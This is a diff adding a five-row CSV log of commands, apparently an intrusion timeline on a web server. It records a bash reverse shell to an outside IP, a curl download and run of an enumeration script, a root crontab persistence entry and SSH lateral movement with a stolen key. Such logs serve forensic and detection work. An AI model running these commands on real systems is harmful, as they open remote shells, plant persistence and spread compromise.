@@ -1,0 +1,6 @@
+row,time_utc,host,user,command
+1,2026-06-15T22:09:10Z,web01,www-data,bash -i >& /dev/tcp/203.0.113.150/4444 0>&1
+2,2026-06-15T22:11:50Z,web01,www-data,curl -s http://203.0.113.150/lin_enum.sh -o /tmp/.x/lin_enum.sh
+3,2026-06-15T22:12:30Z,web01,www-data,bash /tmp/.x/lin_enum.sh
+4,2026-06-15T22:18:00Z,web01,root,echo '* * * * * root /usr/local/sbin/.update' >> /etc/crontab
+5,2026-06-15T22:20:44Z,web01,root,ssh -i /root/.ssh/id_ed25519 deploy@db01
